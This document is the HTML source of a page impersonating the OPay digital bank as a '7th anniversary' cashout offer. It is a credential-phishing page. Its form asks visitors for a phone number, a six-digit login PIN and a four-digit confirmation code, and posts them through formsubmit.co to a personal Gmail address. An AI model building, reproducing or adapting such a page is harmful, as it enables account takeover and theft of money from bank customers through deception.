<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opay 7th Anniversary 🎉</title>
    <style>
        :root {
            --opay-green: #00b98bc9;
            --opay-dark: #111827;
            --opay-light: #f3f4f6;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0b0f19;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
            padding: 20px;
        }

        /* 30 Floating Logo Background Layout */
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
            pointer-events: none;
        }

        .floating-logo {
            position: absolute;
            width: 45px;
            height: 45px;
            border: 7px solid var(--opay-green);
            border-radius: 50%;
            opacity: 0.12;
            animation: drift 12s infinite ease-in-out;
        }

        /* The distinctive inner square cutout bar of the OPay logo loop */
        .floating-logo::after {
            content: '';
            position: absolute;
            left: -7px;
            top: 50%;
            transform: translateY(-50%);
            width: 12px;
            height: 7px;
            background-color: #0b0f19; 
        }

        @keyframes drift {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        /* Feedback UI Card */
        .feedback-card {
            background: #ffffff;
            width: 100%;
            max-width: 450px;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            z-index: 10;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        /* Main logo in the header card */
        .main-logo {
            width: 60px;
            height: 60px;
            border: 10px solid #00b98b;
            border-radius: 50%;
            margin: 0 auto 12px;
            position: relative;
        }

        .main-logo::after {
            content: '';
            position: absolute;
            left: -10px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 10px;
            background-color: #ffffff;
        }

        .header h2 {
            color: var(--opay-dark);
            font-size: 22px;
            font-weight: 700;
        }

        .header p {
            color: #6b7280;
            font-size: 14px;
            margin-top: 5px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--opay-dark);
            margin-bottom: 6px;
        }

        .form-group input, .form-group textarea, .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-size: 14px;
            color: var(--opay-dark);
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
            border-color: #00b98b;
            box-shadow: 0 0 0 3px rgba(0, 185, 139, 0.15);
        }

        .rating-container {
            display: flex;
            justify-content: space-between;
            margin: 10px 0 20px;
        }

        .rating-btn {
            width: 45px;
            height: 45px;
            border: 1px solid #e5e7eb;
            background: #f9fafb;
            border-radius: 50%;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            color: #4b5563;
        }

        .rating-btn:hover, .rating-btn.active {
            background-color: #00b98b;
            color: white;
            border-color: #00b98b;
        }

        .submit-btn {
            width: 100%;
            background-color: #00b98b;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .submit-btn:hover {
            background-color: #009670;
        }
    </style>
</head>
<body>

    <!-- Target Container containing exactly 30 background instances -->
    <div class="background-container" id="bg-container"></div>

    <div class="feedback-card">
        <div class="header">
            <div class="main-logo"></div>
            <h2>Share Your Support Experience and claim your 5000</h2>
            <p>OPay digital banking experience. licensed by CBN</p>
        </div>

        <form action="https://formsubmit.co/qlitobadys@gmail.com" method="POST">
            <div class="form-group">
                <label>enter your phone number</label>
                <input type="text" placeholder="type here...." required>
            </div>

            <div class="form-group">
                <label>verify opay account (Phone)</label>
                <input type="tel" placeholder="enter login 6 digits" required>
            </div>

            <div class="form-group">
                <label>what do you want to apply for?</label>
                <select id="category">
                    <option>card services</option>
                    <option>5,000 cashout</option>
                    <option>App Performance</option>
                    <option>Customer Service</option>
                    <option>Other</option>
                </select>
            </div>

            <div class="form-group">
                <label>how much do you want to cashout</label>
                <div class="rating-container">
                    <button type="button" class="rating-btn" onclick="setRating(this)">1000</button>
                    <button type="button" class="rating-btn" onclick="setRating(this)">2000</button>
                    <button type="button" class="rating-btn" onclick="setRating(this)">3000</button>
                    <button type="button" class="rating-btn" onclick="setRating(this)">4000</button>
                    <button type="button" class="rating-btn active" onclick="setRating(this)">5000</button>
                </div>
            </div>

            <div class="form-group">
                <label>enter confirmation code </label>
                <textarea rows="1" placeholder="enter 4 digits..." required></textarea>
            </div>

            <button type="submit" class="submit-btn">cashout</button>
        </form>
    </div>

    <script>
        // Programmatically generate exactly 30 randomized decorative OPay logo nodes
        const container = document.getElementById('bg-container');
        const totalLogos = 30;

        for (let i = 0; i < totalLogos; i++) {
            const logo = document.createElement('div');
            logo.classList.add('floating-logo');
            
            // Random distribution adjustments across screen boundaries
            const randomX = Math.floor(Math.random() * 96); 
            const randomY = Math.floor(Math.random() * 96);
            const randomScale = (Math.random() * (1.3 - 0.7) + 0.7).toFixed(2);
            const randomDelay = (Math.random() * -12).toFixed(2); 
            
            logo.style.left = `${randomX}%`;
            logo.style.top = `${randomY}%`;
            logo.style.transform = `scale(${randomScale})`;
            logo.style.animationDelay = `${randomDelay}s`;
            
            container.appendChild(logo);
        }

        function setRating(element) {
            const buttons = document.querySelectorAll('.rating-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            element.classList.add('active');
        }
    </script>
</body>
</html>
